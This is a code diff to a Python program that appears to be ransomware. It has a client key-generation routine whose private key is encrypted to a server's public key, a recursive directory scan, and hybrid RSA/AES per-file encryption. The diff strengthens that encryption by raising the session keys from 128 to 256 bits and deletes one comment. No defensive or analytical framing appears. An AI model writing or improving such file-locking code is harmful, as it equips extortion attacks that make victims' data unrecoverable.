@@ -24,7 +24,7 @@ def generate_client_key():
 
     # generate a session key to encrypt the client private key
     key = RSA.import_key(serverPublicKey)
-    sessionKey = os.urandom(16)
+    sessionKey = os.urandom(32)
 
     # encrypt the session key with server public key
     cipher = PKCS1_OAEP.new(key)
@@ -34,7 +34,6 @@ def generate_client_key():
     cipher = AES.new(sessionKey, AES.MODE_EAX)
     encryptedPrivateKey, tag = cipher.encrypt_and_digest(privateKey)
 
-    # encrypt the private key with server's public key
     with open('client_private.pem', 'wb') as f:
         [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, encryptedPrivateKey) ]
         print('Private key saved to client_private.pem')
@@ -56,7 +55,7 @@ def scanRecurse(baseDir):
 def encryptFile(dataFile, publicKey):
     # create public key object
     key = RSA.import_key(publicKey)
-    sessionKey = os.urandom(16)
+    sessionKey = os.urandom(32)
 
     # encrypt the session key with the public key
     cipher = PKCS1_OAEP.new(key)
